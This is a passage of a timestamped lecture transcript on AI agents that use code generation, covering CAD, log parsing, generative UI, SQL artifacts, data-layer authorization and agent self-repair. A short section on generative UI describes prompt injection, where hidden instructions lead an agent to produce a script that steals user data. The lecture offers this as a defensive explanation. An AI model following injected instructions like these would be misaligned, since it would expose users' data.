+What a 3D generative model spits out is a triangle mesh: curved surfaces are approximated by countless tiny facets and look pitted under magnification.
+
+627
+01:38:19.350 --> 01:38:38.450
+The difference becomes clear when the client says "change the mounting holes from M5 to M6": on the code route, you change one number and rerun, and every other dimension stays exactly the same; on the generative-model route, the only option is to regenerate the whole thing—whether the other dimensions drift is a matter of luck.
+
+628
+01:38:38.450 --> 01:38:50.437
+So choosing a route is itself a decision the Agent must make: weigh the artifact's intrinsic complexity and precision requirements, and assign the task to code generation or to a 3D generative model.
+
+629
+01:38:50.437 --> 01:39:00.700
+In real systems the two routes can also be mixed—generate the geometry parametrically with code and hand the surface texture to a generative model, taking the best of each.
+
+630
+01:39:00.700 --> 01:39:09.675
+Experiment 5-9 intermediate difficulty, two stars: : Two Generation Routes for the Same Part—Code vs. Generative Model
+
+631
+01:39:09.675 --> 01:39:28.450
+Experiment objective: Take the same mechanical part with dimensional specifications and compare the code-generation and 3D-generative-model routes on dimensional accuracy, editability, and manufacturability, verifying the "choose the route by intrinsic complexity and precision requirements" decision framework.
+
+632
+01:39:28.450 --> 01:39:43.087
+Technical approach: A natural-language requirement with an explicit specification (e.g., "a flange, outer diameter 80mm, thickness 10mm, 4 evenly spaced M5 mounting holes on a 60mm bolt circle").
+
+633
+01:39:43.087 --> 01:39:51.025
+Route A: the Agent writes CadQuery (or OpenSCAD) code to construct the part and exports STEP and STL.
+
+634
+01:39:51.025 --> 01:39:59.587
+Route B: hand the same specification to a 3D generative model (such as Hunyuan 3D) to obtain a triangle mesh.
+
+635
+01:39:59.587 --> 01:40:12.812
+Programmatic verification: measure the key dimensions of both routes' outputs (outer diameter, thickness, hole positions, hole diameters) against the specification, and check the flatness of the mounting face.
+
+636
+01:40:12.812 --> 01:40:31.612
+Then issue the change request "change the mounting holes from M5 to M6" and record the modification cost of each route—on the code route, change one parameter and rerun; on the generative-model route, the only option is to regenerate the whole thing, with no guarantee that the other dimensions stay unchanged.
+
+637
+01:40:31.612 --> 01:40:45.862
+Control group: generate a potted plant, and the merits of the two routes are exactly reversed—on the code route, even with procedural noise added, the result is stiff and lifeless; on the generative-model route, it is natural and vivid.
+
+638
+01:40:45.862 --> 01:40:48.362
+Code as a System Adapter.
+
+639
+01:40:48.362 --> 01:40:56.225
+The code in the previous sections mostly produces "human-facing" things — reports, slides, interfaces.
+
+640
+01:40:56.225 --> 01:41:01.300
+The code in this section points in another direction: connecting machine to machine.
+
+641
+01:41:01.300 --> 01:41:16.450
+In real systems, the external services an Agent must talk to often have no ready-made SDK, and their interfaces are rarely tidy — documentation may be missing, response formats may be nonstandard, and fields may drift across versions.
+
+642
+01:41:16.450 --> 01:41:19.937
+The Agent need not wait for a prebuilt adapter.
+
+643
+01:41:19.937 --> 01:41:37.912
+It can read the API documentation or inspect a few real responses, then generate the adapter on demand: construct an HTTP client, assemble authentication headers, parse the nonstandard response structure, and translate the upstream data model into a shape the downstream can consume.
+
+644
+01:41:37.912 --> 01:41:47.150
+Code here is "universal glue" for connecting arbitrary systems — wherever there is a gap, a piece of glue is generated on demand to fill it.
+
+645
+01:41:47.150 --> 01:41:51.962
+This is the heart of the meta-capability's "system interface" direction.
+
+646
+01:41:51.962 --> 01:42:04.912
+The adaptive log parsing developed below is this capability made concrete in the observability setting: facing log formats that never stop evolving, the Agent likewise adapts by generating parsing code on the fly.
+
+647
+01:42:05.068 --> 01:42:31.018
+This "universal glue" can also extend to systems with no API at all: when an external system only exposes a graphical interface, the Agent can first operate the interface through Computer Use (detailed in Chapter 6), then turn the successful sequence of actions into a reusable RPA tool — the next time the same task comes up, it simply runs the code, fast and stable, with no expensive visual reasoning required.
+
+648
+01:42:31.018 --> 01:42:39.343
+RPA, you might say, is the system adapter taken to its extreme: an adapter for systems with no programmatic interface.
+
+649
+01:42:39.343 --> 01:42:45.180
+Chapter 9 develops this process of recording workflows and turning them into reusable code.
+
+650
+01:42:45.180 --> 01:42:51.593
+Data processing is among the most common — and most tiresome — tasks in software systems.
+
+651
+01:42:51.593 --> 01:42:56.330
+The root cause is that data formats are diverse and never stand still.
+
+652
+01:42:56.330 --> 01:43:04.168
+A single system may change its formats many times as it evolves — new fields, restructured nesting, new types.
+
+653
+01:43:04.168 --> 01:43:14.755
+Hand-writing a parser for every format carries a punishing maintenance cost: each change means updating the parsing logic, testing compatibility, and shipping a new version.
+
+654
+01:43:14.755 --> 01:43:28.593
+Code generation offers a different approach entirely: when the Agent meets a new format, it generates parsing code on the fly from sample data, so the system tracks the evolution of formats automatically, with no human intervention.
+
+655
+01:43:28.593 --> 01:43:31.755
+Agent Log Parsing and Visualization.
+
+656
+01:43:31.755 --> 01:43:37.368
+The observability of Agent systems depends on the visualization of execution flows.
+
+657
+01:43:37.368 --> 01:43:48.343
+A complex Agent task may involve hundreds of steps, including multiple LLM calls, dozens of tool executions, and interactions between multiple sub-agents.
+
+658
+01:43:48.343 --> 01:44:03.880
+Visualizing this data faces multiple challenges: different tools return data in different structures, and formats evolve with system iterations; a complete trajectory may contain hundreds of thousands of characters, requiring a balance between overview and detail.
+
+659
+01:44:03.880 --> 01:44:09.768
+Code generation offers an elegant solution: establishing an auto-repair feedback loop.
+
+660
+01:44:09.768 --> 01:44:21.293
+When the frontend encounters an unparseable log format, instead of displaying an error, it automatically reports the failure information (raw log sample, detailed error) to the Agent.
+
+661
+01:44:21.293 --> 01:44:27.480
+The Agent analyzes the sample data structure and generates frontend code that can correctly parse it.
+
+662
+01:44:27.480 --> 01:44:36.218
+The code is first tested automatically in a virtual browser to verify parsing correctness, while a Vision LLM assesses the visualization.
+
+663
+01:44:36.218 --> 01:44:41.293
+If it passes both checks, it is deployed to the frontend as a hot update.
+
+664
+01:44:41.293 --> 01:44:47.755
+Experiment 5-10 advanced difficulty, three stars: : Adaptive Log Parsing System
+
+665
+01:44:47.755 --> 01:44:53.055
+Experiment Goal: Build a self-evolving Agent log visualization system.
+
+666
+01:44:53.055 --> 01:44:58.118
+Technical Approach: The initial system only supports basic formats.
+
+667
+01:44:58.118 --> 01:45:05.655
+Frontend detects parsing failure → Reports to Agent → Generates parsing code → Virtual browser testing → Hot update deployment.
+
+668
+01:45:05.655 --> 01:45:08.555
+The entire process is automated.
+
+669
+01:45:08.555 --> 01:45:19.268
+Acceptance Criteria: Automatically detect failures and trigger learning, generate code that passes automated tests, correctly parse new formats after the hot update.
+
+670
+01:45:19.268 --> 01:45:24.468
+Automatic Analysis and Problem Diagnosis of Agent Execution Logs.
+
+671
+01:45:24.468 --> 01:45:31.680
+Agents in production generate a large volume of trajectory logs (recording the complete process of each task).
+
+672
+01:45:31.680 --> 01:45:39.868
+However, identifying problems, locating root causes, and constructing test cases from these logs is a high-cost endeavor.
+
+673
+01:45:39.868 --> 01:45:46.643
+Failures may emerge from interactions among multiple modules, making root causes difficult to isolate.
+
+674
+01:45:46.643 --> 01:45:53.555
+They may also be expensive to reproduce because test environments rarely capture the full complexity of production.
+
+675
+01:45:53.555 --> 01:45:59.680
+Finally, bugs often recur when fixes are not covered by systematic regression tests.
+
+676
+01:45:59.836 --> 01:46:04.261
+Code generation provides an automated path for diagnosis.
+
+677
+01:46:04.211 --> 01:46:19.086
+The Agent can read production logs, combine them with architecture documents and PRDs (Product Requirement Documents) to automatically determine whether the execution flow meets expectations, and pinpoint the problematic components and modules.
+
+678
+01:46:19.086 --> 01:46:40.986
+Based on the analysis results, it generates structured problem reports (priority, module, description, improvement suggestions) and regression test cases—the test cases reference the problem trajectory ID and key interaction rounds, and the test framework automatically replays them to verify that the fixed system produces correct behavior for the same input.
+
+679
+01:46:40.986 --> 01:46:51.886
+Finally, the Agent connects to GitHub via MCP to create an Issue and assign it to the relevant developer, completing the full automation from problem discovery to task assignment.
+
+680
+01:46:51.886 --> 01:46:59.823
+Experiment 5-11 advanced difficulty, three stars: : Intelligent Diagnostic System for Production Logs
+
+681
+01:46:59.823 --> 01:47:08.061
+Experiment Goal: Automatically discover problems from production trajectories, generate test cases, and create work items.
+
+682
+01:47:08.061 --> 01:47:18.898
+Technical Approach: The Agent analyzes a set of production trajectories alongside system architecture documents and PRDs to identify problem patterns and the modules involved.
+
+683
+01:47:18.898 --> 01:47:26.361
+It then generates structured problem reports containing the priority, module, description, and recommended improvements.
+
+684
+01:47:26.361 --> 01:47:35.923
+It also generates regression tests tied to trajectory IDs and interaction rounds; the test framework replays these cases and verifies the results.
+
+685
+01:47:35.923 --> 01:47:40.223
+Finally, the Agent creates GitHub issues through MCP.
+
+686
+01:47:40.223 --> 01:47:46.523
+As illustrated in Figure 5-7: Intelligent Production Log Diagnostic Pipeline.
+
+687
+01:47:46.523 --> 01:47:48.998
+Code as Generative UI.
+
+688
+01:47:48.998 --> 01:47:54.298
+Traditional Agent systems interact with users mainly through plain-text dialogue.
+
+689
+01:47:54.298 --> 01:48:00.123
+But text is a linear, one-dimensional medium, and in many scenarios an inefficient one.
+
+690
+01:48:00.123 --> 01:48:14.023
+Collecting structured information requires a lengthy back-and-forth; complex data relationships are difficult to express in plain text; and when users must choose among options, a text list is far less intuitive than a visual interface.
+
+691
+01:48:14.023 --> 01:48:27.998
+Code generation offers a way past these limitations: Agents can dynamically generate forms, interactive charts, and even complete web applications, turning static text dialogue into rich, multimodal interaction.
+
+692
+01:48:27.998 --> 01:48:34.111
+This pattern, where the Agent dynamically generates the interface, is called Generative UI.
+
+693
+01:48:34.111 --> 01:48:39.048
+A2UI-like Protocols: Standardizing Generative UI.
+
+694
+01:48:39.220 --> 01:48:49.882
+Allowing Agents to generate HTML and JavaScript that the client renders and executes directly creates a fundamental security risk: the generated code may be malicious.
+
+695
+01:48:49.832 --> 01:49:00.970
+For example, if someone deliberately hides an instruction in the input, the Agent could be manipulated by prompt injection, unknowingly generating a script that stealthily steals user data.
+
+696
+01:49:00.970 --> 01:49:19.382
+Here the causal chain matters: prompt injection—malicious instructions mixed into the Agent's input—is the cause, while executing the resulting malicious script in the browser and stealing data resembles traditional Web XSS (Cross-Site Scripting); the attack as a whole should not simply be labeled XSS.
+
+697
+01:49:19.382 --> 01:49:26.607
+Declarative interface protocols such as A2UI (Agent-to-User Interface) offer a safer approach.
+
+698
+01:49:26.607 --> 01:49:38.645
+Instead of generating executable code directly, the Agent outputs only a JSON "UI description manifest," such as "Display a table with three rows and two columns titled 'Sales Data.
+
+699
+01:49:38.645 --> 01:49:43.995
+The client then renders the interface using its own predefined, safe components.
+
+700
+01:49:43.995 --> 01:49:56.070
+This is like a restaurant menu: the customer (Agent) can order only dishes on the menu (predefined components), not enter the kitchen and prepare arbitrary dishes (execute arbitrary code).
+
+701
+01:49:56.070 --> 01:50:02.882
+One common point of confusion is AG-UI (Agent-User Interaction, proposed by CopilotKit).
+
+702
+01:50:02.882 --> 01:50:19.632
+Despite the similar name, it is not a UI description language but an event and transport protocol that streams the Agent's execution state—messages, tool calls, and state patches—to the frontend; it can also carry UI payloads such as A2UI manifests.
+
+703
+01:50:19.632 --> 01:50:25.745
+The two are complementary and should not be grouped as examples of the same declarative-interface category.
+
+704
+01:50:25.745 --> 01:50:43.595
+The core design principle of such protocols is security-first: the client maintains a trusted component catalog (e.g., Card, Button, TextField, Table), and if the catalog and renderer are correctly enforced, the Agent may request only cataloged components and cannot inject arbitrary code.
+
+705
+01:50:43.595 --> 01:50:51.220
+The client renders using its own native components, not by executing arbitrary HTML generated by the Agent.
+
+706
+01:50:51.220 --> 01:51:05.132
+These protocols typically also support cross-platform rendering (the same description renders in React, Flutter, and native apps) and incremental generation (for example, by streaming JSONL that the client renders as it arrives).
+
+707
+01:51:05.132 --> 01:51:21.595
+Of course, the declarative approach is suitable for standardized interaction scenarios (forms, tables, cards), while for highly customized needs (e.g., custom visualizations, game interfaces), direct code generation remains the more flexible choice.
+
+708
+01:51:21.595 --> 01:51:25.445
+Below are specific applications of both patterns.
+
+709
+01:51:25.445 --> 01:51:30.320
+Delivering Results with HTML: Replacing Markdown Reports.
+
+710
+01:51:30.320 --> 01:51:37.182
+Generative UI is not only used during interaction but is also changing the form of the Agent's final deliverable.
+
+711
+01:51:37.182 --> 01:51:46.257
+Traditionally, an Agent finishes a task and hands over a Markdown report; but paging through linearly arranged Markdown is not a pleasant way to read.
+
+712
+01:51:46.257 --> 01:51:53.857
+As Agents get better at generating frontend code, practice is shifting toward having them produce HTML directly.
+
+713
+01:51:53.857 --> 01:51:59.395
+Compared to Markdown, HTML deliverables have several distinct advantages.
+
+714
+01:51:59.395 --> 01:52:10.157
+First, interactive demonstrations let users see how the system works in an interactive form, often making it easier to understand at a glance than through lengthy textual descriptions.
+
+715
+01:52:10.157 --> 01:52:20.095
+Second, better data visualization lets users explore data through charts and interactive controls for browsing, filtering, and drilling down into details.
+
+716
+01:52:20.095 --> 01:52:30.945
+Third, continuously improvable deliverables allow the Agent to update and extend an HTML website throughout the task instead of producing a static artifact only at the end.
+
+717
+01:52:31.108 --> 01:52:39.945
+Take the author's own experience writing research papers as an example: for each research project, the author maintains an interactive website.
+
+718
+01:52:39.895 --> 01:52:49.545
+It serves as both the final deliverable and a living document throughout the research process—the author has the Agent continuously update it as experiments progress.
+
+719
+01:52:49.545 --> 01:52:52.983
+This website serves at least three purposes.
+
+720
+01:52:52.983 --> 01:53:15.458
+First, experiment data traceability: the specific data for every experiment, the prompts used, and the LLM's raw responses can all be inspected item by item on the site; laying everything out in the open makes it easier to spot problems in data construction, format, and distribution, and to notice systematic biases in the LLM's responses or the judge's scoring.
+
+721
+01:53:15.458 --> 01:53:26.758
+Second, training metric monitoring: the site displays training curves directly, making it easy to monitor the model's internal health metrics and determine whether the training process remains healthy.
+
+722
+01:53:26.758 --> 01:53:47.133
+The term borrows from medicine: these are internal signals of whether the training process itself is healthy—training and validation loss, gradient norm, learning rate, the model's perplexity when emitting tokens (a measure of its "confidence" in its own output), and in reinforcement learning, reward, KL divergence, and policy entropy.
+
+723
+01:53:47.133 --> 01:54:03.970
+They differ from final outcome metrics like task accuracy: just as physiological readings in a check-up stand apart from a person's outward performance, internal health metrics often surface problems—non-converging loss, exploding gradients, training collapse—much earlier.
+
+724
+01:54:03.970 --> 01:54:14.683
+Third, demonstrating system operation: visualizations reveal how the entire system works, allowing readers to grasp the structure of the AI-built system at a glance.
+
+725
+01:54:14.683 --> 01:54:17.208
+Clarifying User Intent.
+
+726
+01:54:17.208 --> 01:54:24.308
+When requirements are vague or incomplete, the Agent must ask clarifying questions to gather the missing information.
+
+727
+01:54:24.308 --> 01:54:48.683
+Products like OpenAI Deep Research typically do this through text-based Q&A, but that approach has clear limits: it is inefficient because each question consumes a dialogue turn, so ten clarification points may require ten rounds; and it is poor at expressing dependencies among questions—for example, a travel destination constrains the available modes of transport—which plain text struggles to present clearly.
+
+728
+01:54:48.683 --> 01:55:05.708
+Through code generation, the Agent can create structured interactive interfaces to replace text-based Q&A. Figure 5-8 illustrates the dynamic form generation process, showing how the Agent transforms clarification questions into a structured interface that can be filled out in one go.
+
+729
+01:55:05.708 --> 01:55:20.570
+The Agent generates an HTML form containing various input controls—text boxes for open-ended information, dropdown menus for predefined options, checkboxes for multiple selections, and date pickers for simplified time input.
+
+730
+01:55:20.570 --> 01:55:30.758
+More advanced versions can use JavaScript to create cascading forms that show or hide follow-up questions and update available options in response to the user's selections.
+
+731
+01:55:30.758 --> 01:55:41.670
+The user fills out the entire form at once, eliminating multiple dialogue rounds, and can clearly see all required information and the logical relationships between questions.
+
+732
+01:55:41.670 --> 01:55:47.220
+As illustrated in Figure 5-8: Dynamic Form Generation Process.
+
+733
+01:55:47.220 --> 01:55:55.108
+Experiment 5-12 intermediate difficulty, two stars: : Intent Clarification System with Dynamic Forms
+
+734
+01:55:55.108 --> 01:56:03.245
+Experiment Goal: Verify the Agent's ability to clarify user intent by dynamically generating HTML forms.
+
+735
+01:56:03.245 --> 01:56:12.645
+Technical Approach: The Agent analyzes the user's request, identifies clarification points, and generates form code with cascading logic.
+
+736
+01:56:12.645 --> 01:56:19.970
+The frontend renders it, the user submits it once, and the Agent parses the JSON data to continue the task.
+
+737
+01:56:19.970 --> 01:56:25.233
+Acceptance Criteria: User inputs "I want to book a flight to Beijing.
+
+738
+01:56:25.233 --> 01:56:39.658
+The Agent generates a form with the following fields: departure city (text input), departure date (date picker), trip type (radio buttons for one-way or round-trip), and return date (displayed only when round-trip is selected).
+
+739
+01:56:39.658 --> 01:56:43.083
+The user submits all information in one go.
+
+740
+01:56:43.083 --> 01:56:45.645
+Generating SQL Queries.
+
+741
+01:56:45.796 --> 01:56:52.558
+Database querying is a scenario where code generation can significantly enhance the interaction experience.
+
+742
+01:56:52.508 --> 01:57:03.021
+Traditional database access relies on GUI tools or handwritten SQL; the former is cumbersome to operate, and the latter requires the user to have specialized knowledge.
+
+743
+01:57:03.021 --> 01:57:17.908
+An Agent can translate natural language into SQL, but there is a key design choice: should the Agent execute the query and describe the results in natural language, or should it generate the SQL as an artifact for the system to execute and the frontend to display?
+
+744
+01:57:17.908 --> 01:57:26.408
+The first approach looks more "intelligent" but is grossly inefficient—a query against a large table may return thousands of rows.
+
+745
+01:57:26.408 --> 01:57:36.171
+Having the LLM read all that and describe it in prose burns tokens and time, and worse, LLMs are notoriously error-prone when "transcribing" data.
+
+746
+01:57:36.171 --> 01:57:39.271
+A better approach is the Artifact pattern.
+
+747
+01:57:39.271 --> 01:57:51.796
+Figure 5-9 shows the workflow of an SQL query Agent: rather than reading the data itself, the Agent generates an SQL query and passes it to the system as a standalone executable artifact.
+
+748
+01:57:51.796 --> 01:57:57.671
+The system executes the query against the database and renders the results in a table for the user.
+
+749
+01:57:57.671 --> 01:58:08.371
+The data therefore flows directly from the database to the interface without passing through the LLM; the LLM writes the query but never has to read and restate thousands of rows.
+
+750
+01:58:08.371 --> 01:58:11.771
+This approach is both faster and more accurate.
+
+751
+01:58:11.771 --> 01:58:16.983
+Generated SQL and visualization code must not be executed directly.
+
+752
+01:58:16.983 --> 01:58:28.546
+The execution layer should use read-only database credentials, parse the SQL, allow only approved SELECT statements, and reject DDL, DML, and multi-statement queries.
+
+753
+01:58:28.546 --> 01:58:38.483
+User-provided values should be bound as server-side parameters, with limits on query time, returned rows, accessible tables, and date ranges.
+
+754
+01:58:38.483 --> 01:58:46.671
+Visualization code should run in a sandbox isolated from the network and filesystem and should produce only an approved result format.
+
+755
+01:58:46.671 --> 01:58:53.896
+The Artifact pattern shortens the data path; it does not replace authorization checks or execution isolation.
+
+756
+01:58:53.896 --> 01:58:59.221
+As illustrated in Figure 5-9: SQL Query Agent Workflow.
+
+757
+01:58:59.221 --> 01:59:08.583
+Going further, the Agent can generate two artifacts that form a pipeline: an SQL query and visualization code, such as code for a bar chart.
+
+758
+01:59:08.583 --> 01:59:13.596
+The frontend passes the SQL results directly to the visualization code.
+
+759
+01:59:13.596 --> 01:59:21.596
+The LLM generates the code but does not participate in the data path—this is the essence of code generation as an interface.
+
+760
+01:59:21.596 --> 01:59:29.408
+Experiment 5-13 intermediate difficulty, two stars: : Natural Language Interaction ERP Agent
+
+761
+01:59:29.408 --> 01:59:40.721
+ERP (Enterprise Resource Planning) software is a critical system for businesses, typically using a GUI interface where complex operations require multiple mouse clicks.
+
+762
+01:59:40.721 --> 01:59:48.858
+An AI Agent can translate users' natural-language requests into SQL queries, enabling automated database access.
+
+763
+01:59:48.858 --> 02:00:10.258
+Requirements: Set up a PostgreSQL database containing two tables: (1) Employee table, including employee ID, name, department, level, hire date, resignation date (NULL means currently employed); (2) Salary table, including employee ID, pay date, salary (one record per month).
+
+764
+02:00:10.258 --> 02:00:13.058
+The Agent automatically answers:
+
+765
+02:00:13.058 --> 02:00:15.796
+What is the average employee tenure?
+
+766
+02:00:15.796 --> 02:00:19.133
+How many active employees are in each department?
+
+767
+02:00:19.133 --> 02:00:22.746
+Which department has the highest average employee level?
+
+768
+02:00:22.746 --> 02:00:26.983
+How many new employees joined each department this year and last year?
+
+769
+02:00:26.983 --> 02:00:32.708
+What was the average salary for department A from March of the year before last to May of last year?
+
+770
+02:00:32.708 --> 02:00:37.483
+Which department had a higher average salary last year, A or B?
+
+771
+02:00:37.483 --> 02:00:41.683
+What is the average salary for employees at each level this year?
+
+772
+02:00:41.683 --> 02:00:49.808
+What is the average salary in the last month for employees with tenure of less than one year, one to two years, and two to three years?
+
+773
+02:00:49.808 --> 02:00:54.771
+Which 10 employees had the largest salary increase from last year to this year?
+
+774
+02:00:54.771 --> 02:01:02.408
+Are there any cases of unpaid wages (employees who were employed during a given month but have no salary record for that month)?
+
+775
+02:01:02.408 --> 02:01:05.258
+Dynamically Generating Software.
+
+776
+02:01:05.428 --> 02:01:12.790
+The ultimate application of code generation is letting the Agent create software entirely dynamically, from scratch.
+
+777
+02:01:12.740 --> 02:01:29.865
+Anthropic's "Imagine with Claude" marks out the frontier: the user makes a request, Claude generates the frontend interface and interaction logic in real time, the user interacts with the generated software, and Claude modifies the code to produce a new interface showing the results.
+
+778
+02:01:29.865 --> 02:01:34.703
+The user watches an application come into being from nothing and keep evolving.
+
+779
+02:01:34.852 --> 02:01:43.527
+Fully dynamic generation, however, is costly and slow—better suited to demonstrations of what is possible than to production use.
+
+780
+02:01:43.477 --> 02:01:47.952
+A more pragmatic approach is to customize an existing framework.
+
+781
+02:01:47.952 --> 02:01:55.477
+This "semi-custom" model preserves the stability of the base software while exposing selected aspects to user control.
+
+782
+02:01:55.477 --> 02:02:15.589
+The user can say "make the button blue," "add a shortcut menu to the sidebar," or "switch to a more readable font"; the Agent updates the frontend code, and HMR (Hot Module Replacement—which updates affected modules without a full-page reload and usually preserves application state) applies the changes immediately.
+
+783
+02:02:15.589 --> 02:02:20.402
+A one-size-fits-all product becomes an experience tailored to each user.
+
+784
+02:02:20.402 --> 02:02:28.164
+Experiment 5-14 intermediate difficulty, two stars: : Conversational Interface Customization System
+
+785
+02:02:28.164 --> 02:02:41.489
+Experiment Goal: Enable users to customize the software interface instantly through natural-language dialogue, and evaluate whether code generation with hot reload can effectively provide personalized user experiences.
+
+786
+02:02:41.489 --> 02:02:55.127
+Technical Approach: Build a basic chatbot application (React frontend and FastAPI backend), and run both components in development mode with hot reload enabled (React HMR and FastAPI reload).
+
+787
+02:02:55.127 --> 02:03:04.727
+Users propose UI customization requirements (colors, fonts, layout, component positions, etc.) during the conversation.
+
+788
+02:03:04.727 --> 02:03:08.127
+The Agent autonomously modifies the code.
+
+789
+02:03:08.127 --> 02:03:17.989
+The hot-reload mechanism automatically detects file changes, the frontend recompiles and refreshes, and the user sees the interface changes in real time.
+
+790
+02:03:17.989 --> 02:03:22.289
+The system supports multiple rounds of iterative customization.
+
+791
+02:03:22.289 --> 02:03:27.664
+Dynamic software changes the traditional security premise along with its flexibility.
+
+792
+02:03:27.664 --> 02:03:37.064
+In the past, application business code was developed, reviewed, tested, and deployed, then remained relatively stable for a period of time.
+
+793
+02:03:37.064 --> 02:03:48.727
+Authorization checks therefore usually lived in the application layer: business code first decided whether the current user could read or modify a record, and only then sent the operation to the database.
+
+794
+02:03:48.727 --> 02:03:58.314
+When interfaces, workflows, and even data-access code can be generated or rewritten by an Agent at any time, that layer is no longer stable.
+
+795
+02:03:58.314 --> 02:04:08.264
+Newly generated code may omit a subtle authorization check, expose a field that was previously hidden, or bypass an existing check through another call path.
+
+796
+02:04:08.264 --> 02:04:20.252
+Whether the cause is an ordinary generation error or dangerous code produced after prompt injection, the result is the same: the permission boundary that business code was supposed to maintain may be silently broken.
+
+797
+02:04:20.252 --> 02:04:28.027
+The security goal for dynamic software therefore cannot be to “make sure the AI writes every authorization check correctly.
+
+798
+02:04:28.027 --> 02:04:34.589
+It should be that permission constraints remain impossible to bypass even when the AI writes incorrect code.
+
+799
+02:04:34.589 --> 02:04:43.527
+If authorization checks live inside the dynamically generated business logic, they share the same trust domain as the code they are meant to constrain.
+
+800
+02:04:43.527 --> 02:04:55.164
+Prompts, tests, and code review reduce the error rate, but they cannot exhaustively cover every execution path introduced by future generations and cannot serve as the final security boundary.
+
+801
+02:04:55.164 --> 02:05:00.164
+A more robust architecture moves the trust boundary down to the data layer.
+
+802
+02:05:00.164 --> 02:05:12.727
+Dynamically generated application code can handle presentation, workflows, and business orchestration, while a stable, human-reviewed mechanism enforces the rules that decide who may do what to which data.
+
+803
+02:05:12.727 --> 02:05:26.839
+Database row-level security can restrict users to records in their own tenant; constraints and validators can reject illegal states; controlled views, stored procedures, or data-access services can expose only approved operations.
+
+804
+02:05:26.839 --> 02:05:36.027
+Every read and write should also carry an access context bound by a trusted runtime, containing the user, tenant, role, or Agent identity.
+
+805
+02:05:36.027 --> 02:05:45.014
+Generated code receives only this scoped identity: it cannot forge the identity or obtain a privileged database credential that bypasses the rules.
+
+806
+02:05:45.014 --> 02:05:51.727
+Even if it omits its own authorization check, the data layer still rejects the unauthorized operation.
+
+807
+02:05:51.892 --> 02:05:57.342
+Moving authorization downward does not mean putting all business logic in the database.
+
+808
+02:05:57.292 --> 02:06:05.429
+The application layer may still perform pre-checks to provide fast feedback, but the data layer must retain final decision authority.
+
+809
+02:06:05.429 --> 02:06:10.517
+The same rule can improve the experience above and provide a guarantee below.
+
+810
+02:06:10.517 --> 02:06:19.829
+That guarantee also requires every data-access path to pass through the trusted data layer; generated code must not be able to connect directly around it.
+
+811
+02:06:19.829 --> 02:06:29.079
+The result is an application whose upper layer can keep changing while its non-negotiable permission constraints remain in a layer that is not rewritten on every generation.
+
+812
+02:06:29.079 --> 02:06:35.879
+This is the data layer of Chapter 1's three-layer guardrail framework—the one that is hardest to bypass.
+
+813
+02:06:35.879 --> 02:06:43.892
+Experiment 5-15 advanced difficulty, three stars: : Permission-Embedded Data Objects for Dynamic Software
+
+814
+02:06:43.892 --> 02:06:54.604
+Experiment Goal: Build an object store that allows application code to be generated or rewritten dynamically while still enforcing authorization and data integrity at the data layer.
+
+815
+02:06:54.604 --> 02:07:04.529
+Verify that generated code cannot cross the stable data boundary by skipping a state-machine transition, writing an out-of-range value, or reading across tenants.
+
+816
+02:07:04.529 --> 02:07:10.529
+Technical Approach: Provide a Python object-store middleware layer over PostgreSQL.
+
+817
+02:07:10.529 --> 02:07:26.942
+Data types declare their permission rules, access context, validators, object relationships, and reactions; every object read or write passes in turn through the permission and validation pipeline, persistence, referential-integrity checks, and so on.
+
+818
+02:07:26.942 --> 02:07:40.079
+Acceptance Criteria: A valid hiring-pipeline update succeeds; skipping a candidate state transition, writing a salary outside the position range, and reading across tenants are all rejected by the data layer.
+
+819
+02:07:40.079 --> 02:07:43.517
+Code Creating Code: Agent Bootstrapping.
+
+820
+02:07:43.517 --> 02:07:52.892
+The previous sections have followed code generation across one domain after another—from mathematical reasoning to document creation to interface customization.
+
+821
+02:07:52.892 --> 02:08:00.792
+Push these capabilities to their limit and a natural question arises: can an Agent use code generation to create another Agent?
+
+822
+02:08:00.792 --> 02:08:05.629
+As illustrated in Figure 5-10: Agent Bootstrapping Loop.
+
+823
+02:08:05.629 --> 02:08:08.992
+Agent Self-Repair: OpenClaw Doctor.
+
+824
+02:08:08.992 --> 02:08:14.117
+A crucial prerequisite for Agent bootstrapping is the ability to self-repair.
+
+825
+02:08:14.117 --> 02:08:21.104
+The doctor command in OpenClaw embodies this capability—it can automatically detect three types of issues:
+
+826
+02:08:21.104 --> 02:08:28.654
+Configuration anomalies: Expired OAuth tokens, legacy configuration formats, port conflicts
+
+827
+02:08:28.654 --> 02:08:34.167
+State issues: Stale session lock files, missing plugin dependencies
+
+828
+02:08:34.167 --> 02:08:39.392
+Service health issues: Gateway not running, missing sandbox images
+
+829
+02:08:39.392 --> 02:08:56.392
+It then automatically resolves them through a layered repair strategy: safe fixes (configuration normalization, lock file cleanup) are executed automatically; risky operations (service restarts, forced configuration overwrites) require user confirmation.
+
+830
+02:08:56.392 --> 02:09:12.454
+Let's not overstate this: high-frequency problems such as expired tokens, stale lock files, and port conflicts have clear detection rules and fixed repair actions, and doctor addresses them first with deterministic checks, much like a traditional operations script.
+
+831
+02:09:12.454 --> 02:09:27.379
+Agent capability becomes meaningful in the second layer: for harder problems beyond those rules, doctor uses an LLM to analyze error logs, interpret configuration files, infer root causes, and produce a targeted repair plan.
+
+832
+02:09:27.379 --> 02:09:40.104
+Deterministic checks resolve common problems reliably, while the LLM covers the long tail; together, the two layers allow doctor --fix to resolve a substantial share of common gateway issues automatically.
+
+833
+02:09:40.104 --> 02:09:52.704
+What makes this an "Agent repairing Agent" pattern is that the Agent works not on an external system but on its own runtime environment, elevating self-repair from a system-adapter function to core bootstrapping infrastructure.
+
+834
+02:09:52.704 --> 02:09:56.154
+Key Techniques for Making an Agent Write an Agent.
+
+835
+02:09:56.308 --> 02:10:08.208
+Creating a high-quality Agent is far harder than generating ordinary application code, because it demands a deep understanding of Agent architecture patterns, best practices, and common pitfalls.
+
+836
+02:10:08.158 --> 02:10:16.383
+Without that domain expertise, even the most powerful code generation models may produce Agents with serious architectural flaws.
+
+837
+02:10:16.383 --> 02:10:18.720
+Common flaws include:
+
+838
+02:10:18.720 --> 02:10:35.420
+Ad hoc context management: Failing to use the standard context format discussed in Chapter 2, stuffing trajectories as plain text into the context, ignoring KV Cache optimizations from structured messages, and introducing boundary-condition bugs in tool-call loops
+
+839
+02:10:35.420 --> 02:10:44.920
+Non-standard tool design: Vague descriptions, missing usage boundary instructions and negative lists, and parameters lacking concrete examples
+
+840
+02:10:44.920 --> 02:10:52.545
+Outdated technology choices: A tendency to use the most common but outdated models and APIs from training data.
+
+841
+02:10:52.545 --> 02:10:58.433
+Solution: Maintain a SOTA knowledge base or equip the Agent with search capabilities
+
+842
+02:10:58.433 --> 02:11:06.620
+Disconnection from the external ecosystem: Using deprecated APIs, unmaintained libraries, or flawed patterns
+
+843
+02:11:06.620 --> 02:11:21.183
